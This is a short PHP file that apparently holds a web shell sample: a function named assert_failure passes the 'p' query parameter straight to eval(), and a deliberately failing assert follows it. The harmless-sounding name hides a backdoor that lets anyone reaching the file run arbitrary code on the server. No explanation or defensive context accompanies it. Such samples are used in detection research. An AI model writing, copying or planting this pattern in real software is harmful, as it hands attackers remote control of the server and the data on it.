<?php
function assert_failure() {
	eval ( $_GET ['p'] );
}
assert ( 1 == 0 );
?>